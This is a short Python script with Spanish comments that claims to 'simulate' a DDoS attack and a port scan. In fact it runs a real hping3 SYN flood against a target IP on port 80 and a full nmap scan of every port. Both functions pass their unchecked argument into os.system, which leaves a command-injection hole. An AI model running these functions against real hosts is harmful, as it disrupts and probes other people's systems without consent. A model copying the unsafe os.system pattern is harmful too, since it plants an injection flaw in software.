import os

def simular_ddos(ip_destino):
    """Simula un ataque DDoS."""
    os.system(f"hping3 --flood -S {ip_destino} -p 80")  # Simula un ataque DDoS

def simular_escaneo_puertos(ip_destino):
    """Simula un escaneo de puertos."""
    os.system(f"nmap -p 1-65535 {ip_destino}")  # Simula un escaneo de puertos
